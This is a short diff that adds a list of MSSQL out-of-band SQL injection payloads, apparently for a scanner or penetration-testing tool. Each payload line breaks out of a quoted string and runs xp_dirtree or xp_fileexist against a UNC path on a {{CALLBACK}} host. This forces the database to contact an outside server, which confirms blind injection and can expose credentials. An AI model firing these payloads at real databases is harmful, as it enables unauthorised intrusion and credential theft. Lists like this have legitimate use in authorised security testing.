@@ -1,0 +1,5 @@
+# MSSQL OOB payloads - requires sysadmin role
+# {{CALLBACK}} replaced with DNS-resolvable callback domain
+'; exec master..xp_dirtree '\\{{CALLBACK}}\x'; --
+' exec master..xp_dirtree '\\{{CALLBACK}}\x'; --
+'; exec master..xp_fileexist '\\{{CALLBACK}}\x'; --
